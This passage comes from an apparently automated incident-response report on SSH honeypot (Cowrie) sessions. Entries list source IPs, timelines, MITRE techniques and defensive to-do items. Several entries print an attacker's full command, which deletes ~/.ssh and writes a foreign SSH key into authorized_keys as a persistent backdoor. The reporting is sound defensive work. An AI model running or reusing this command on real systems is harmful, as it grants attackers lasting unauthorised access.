| `2026-06-07 12:10:23` | `cowrie.command.input` |
| `2026-06-07 12:10:23` | `cowrie.session.file_download` |
| `2026-06-07 12:10:23` | `cowrie.log.closed` |
| `2026-06-07 12:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34fb3b86183

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:10 |
| **Last Seen** | 2026-06-07 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:10:25` | `cowrie.session.connect` |
| `2026-06-07 12:10:25` | `cowrie.client.version` |
| `2026-06-07 12:10:25` | `cowrie.client.kex` |
| `2026-06-07 12:10:25` | `cowrie.login.success` |
| `2026-06-07 12:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f9320db4350

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:10 |
| **Last Seen** | 2026-06-07 12:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:10:50` | `cowrie.session.connect` |
| `2026-06-07 12:10:50` | `cowrie.client.version` |
| `2026-06-07 12:10:50` | `cowrie.client.kex` |
| `2026-06-07 12:10:50` | `cowrie.login.success` |
| `2026-06-07 12:10:51` | `cowrie.session.params` |
| `2026-06-07 12:10:51` | `cowrie.command.input` |
| `2026-06-07 12:10:51` | `cowrie.command.failed` |
| `2026-06-07 12:10:51` | `cowrie.log.closed` |
| `2026-06-07 12:10:51` | `cowrie.session.params` |
| `2026-06-07 12:10:51` | `cowrie.command.input` |
| `2026-06-07 12:10:51` | `cowrie.session.file_download` |
| `2026-06-07 12:10:51` | `cowrie.log.closed` |
| `2026-06-07 12:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133a37c58603

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:10 |
| **Last Seen** | 2026-06-07 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:10:52` | `cowrie.session.connect` |
| `2026-06-07 12:10:52` | `cowrie.client.version` |
| `2026-06-07 12:10:52` | `cowrie.client.kex` |
| `2026-06-07 12:10:53` | `cowrie.login.success` |
| `2026-06-07 12:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9a3bb819a6

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:12 |
| **Last Seen** | 2026-06-07 12:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:12:29` | `cowrie.session.connect` |
| `2026-06-07 12:12:29` | `cowrie.client.version` |
| `2026-06-07 12:12:29` | `cowrie.client.kex` |
| `2026-06-07 12:12:31` | `cowrie.login.success` |
| `2026-06-07 12:12:31` | `cowrie.session.params` |
| `2026-06-07 12:12:31` | `cowrie.command.input` |
| `2026-06-07 12:12:31` | `cowrie.command.failed` |
| `2026-06-07 12:12:32` | `cowrie.log.closed` |
| `2026-06-07 12:12:32` | `cowrie.session.params` |
| `2026-06-07 12:12:32` | `cowrie.command.input` |
| `2026-06-07 12:12:32` | `cowrie.session.file_download` |
| `2026-06-07 12:12:32` | `cowrie.log.closed` |
| `2026-06-07 12:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee338fb7c28

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:12 |
| **Last Seen** | 2026-06-07 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:12:36` | `cowrie.session.connect` |
| `2026-06-07 12:12:36` | `cowrie.client.version` |
| `2026-06-07 12:12:36` | `cowrie.client.kex` |
| `2026-06-07 12:12:37` | `cowrie.login.success` |
| `2026-06-07 12:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7fcdc0ed7d

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:14 |
| **Last Seen** | 2026-06-07 12:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:14:30` | `cowrie.session.connect` |
| `2026-06-07 12:14:30` | `cowrie.client.version` |
| `2026-06-07 12:14:31` | `cowrie.client.kex` |
| `2026-06-07 12:14:32` | `cowrie.login.success` |
| `2026-06-07 12:14:33` | `cowrie.session.params` |
| `2026-06-07 12:14:33` | `cowrie.command.input` |
| `2026-06-07 12:14:33` | `cowrie.command.failed` |
| `2026-06-07 12:14:34` | `cowrie.log.closed` |
| `2026-06-07 12:14:34` | `cowrie.session.params` |
| `2026-06-07 12:14:34` | `cowrie.command.input` |
| `2026-06-07 12:14:35` | `cowrie.session.file_download` |
| `2026-06-07 12:14:35` | `cowrie.log.closed` |
| `2026-06-07 12:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29bb4ccfeadd

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:14 |
| **Last Seen** | 2026-06-07 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:14:38` | `cowrie.session.connect` |
| `2026-06-07 12:14:38` | `cowrie.client.version` |
| `2026-06-07 12:14:38` | `cowrie.client.kex` |
| `2026-06-07 12:14:40` | `cowrie.login.success` |
| `2026-06-07 12:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a5db2830f43

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:14 |
| **Last Seen** | 2026-06-07 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:14:43` | `cowrie.session.connect` |
| `2026-06-07 12:14:43` | `cowrie.client.version` |
| `2026-06-07 12:14:43` | `cowrie.client.kex` |
| `2026-06-07 12:14:43` | `cowrie.login.success` |
| `2026-06-07 12:14:43` | `cowrie.session.params` |
| `2026-06-07 12:14:43` | `cowrie.command.input` |
| `2026-06-07 12:14:43` | `cowrie.command.failed` |
| `2026-06-07 12:14:44` | `cowrie.log.closed` |
| `2026-06-07 12:14:44` | `cowrie.session.params` |
| `2026-06-07 12:14:44` | `cowrie.command.input` |
| `2026-06-07 12:14:44` | `cowrie.session.file_download` |
| `2026-06-07 12:14:44` | `cowrie.log.closed` |
| `2026-06-07 12:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f06b4f4c0cf

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:14 |
| **Last Seen** | 2026-06-07 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:14:45` | `cowrie.session.connect` |
| `2026-06-07 12:14:45` | `cowrie.client.version` |
| `2026-06-07 12:14:45` | `cowrie.client.kex` |
| `2026-06-07 12:14:46` | `cowrie.login.success` |
| `2026-06-07 12:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d74362e12b

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:14 |
| **Last Seen** | 2026-06-07 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:14:53` | `cowrie.session.connect` |
| `2026-06-07 12:14:53` | `cowrie.client.version` |
| `2026-06-07 12:14:53` | `cowrie.client.kex` |
| `2026-06-07 12:14:53` | `cowrie.login.success` |
| `2026-06-07 12:14:53` | `cowrie.session.params` |
| `2026-06-07 12:14:53` | `cowrie.command.input` |
| `2026-06-07 12:14:53` | `cowrie.command.failed` |
| `2026-06-07 12:14:53` | `cowrie.log.closed` |
| `2026-06-07 12:14:53` | `cowrie.session.params` |
| `2026-06-07 12:14:53` | `cowrie.command.input` |
| `2026-06-07 12:14:53` | `cowrie.session.file_download` |
| `2026-06-07 12:14:53` | `cowrie.log.closed` |
| `2026-06-07 12:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-807c25cd414b

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:14 |
| **Last Seen** | 2026-06-07 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:14:55` | `cowrie.session.connect` |
| `2026-06-07 12:14:55` | `cowrie.client.version` |
| `2026-06-07 12:14:55` | `cowrie.client.kex` |
| `2026-06-07 12:14:55` | `cowrie.login.success` |
| `2026-06-07 12:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0554886e3f

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:18 |
| **Last Seen** | 2026-06-07 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:18:30` | `cowrie.session.connect` |
| `2026-06-07 12:18:30` | `cowrie.client.version` |
| `2026-06-07 12:18:30` | `cowrie.client.kex` |
| `2026-06-07 12:18:31` | `cowrie.login.success` |
| `2026-06-07 12:18:31` | `cowrie.session.params` |
| `2026-06-07 12:18:31` | `cowrie.command.input` |
| `2026-06-07 12:18:31` | `cowrie.command.failed` |
| `2026-06-07 12:18:31` | `cowrie.log.closed` |
| `2026-06-07 12:18:31` | `cowrie.session.params` |
| `2026-06-07 12:18:31` | `cowrie.command.input` |
| `2026-06-07 12:18:31` | `cowrie.session.file_download` |
| `2026-06-07 12:18:31` | `cowrie.log.closed` |
| `2026-06-07 12:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aae90a5f405

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:18 |
| **Last Seen** | 2026-06-07 12:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:18:33` | `cowrie.session.connect` |
| `2026-06-07 12:18:33` | `cowrie.client.version` |
| `2026-06-07 12:18:33` | `cowrie.client.kex` |
| `2026-06-07 12:18:33` | `cowrie.login.success` |
| `2026-06-07 12:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46e41b7f1ae6

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:23 |
| **Last Seen** | 2026-06-07 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:23:25` | `cowrie.session.connect` |
| `2026-06-07 12:23:25` | `cowrie.client.version` |
| `2026-06-07 12:23:25` | `cowrie.client.kex` |
| `2026-06-07 12:23:25` | `cowrie.login.success` |
| `2026-06-07 12:23:25` | `cowrie.session.params` |
| `2026-06-07 12:23:25` | `cowrie.command.input` |
| `2026-06-07 12:23:25` | `cowrie.command.failed` |
| `2026-06-07 12:23:25` | `cowrie.log.closed` |
| `2026-06-07 12:23:25` | `cowrie.session.params` |
| `2026-06-07 12:23:25` | `cowrie.command.input` |
| `2026-06-07 12:23:25` | `cowrie.session.file_download` |
| `2026-06-07 12:23:25` | `cowrie.log.closed` |
| `2026-06-07 12:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a9521bae5d

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:23 |
| **Last Seen** | 2026-06-07 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:23:26` | `cowrie.session.connect` |
| `2026-06-07 12:23:26` | `cowrie.client.version` |
| `2026-06-07 12:23:26` | `cowrie.client.kex` |
| `2026-06-07 12:23:26` | `cowrie.login.success` |
| `2026-06-07 12:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18d71399cb78

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:24 |
| **Last Seen** | 2026-06-07 12:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:24:34` | `cowrie.session.connect` |
| `2026-06-07 12:24:34` | `cowrie.client.version` |
| `2026-06-07 12:24:36` | `cowrie.client.kex` |
| `2026-06-07 12:24:37` | `cowrie.login.success` |
| `2026-06-07 12:24:38` | `cowrie.session.params` |
| `2026-06-07 12:24:38` | `cowrie.command.input` |
| `2026-06-07 12:24:38` | `cowrie.command.failed` |
| `2026-06-07 12:24:39` | `cowrie.log.closed` |
| `2026-06-07 12:24:39` | `cowrie.session.params` |
| `2026-06-07 12:24:39` | `cowrie.command.input` |
| `2026-06-07 12:24:40` | `cowrie.session.file_download` |
| `2026-06-07 12:24:40` | `cowrie.log.closed` |
| `2026-06-07 12:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a7966c33f1

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:24 |
| **Last Seen** | 2026-06-07 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:24:45` | `cowrie.session.connect` |
| `2026-06-07 12:24:45` | `cowrie.client.version` |
| `2026-06-07 12:24:45` | `cowrie.client.kex` |
| `2026-06-07 12:24:46` | `cowrie.login.success` |
| `2026-06-07 12:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528a01957a88

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:25 |
| **Last Seen** | 2026-06-07 12:25 |
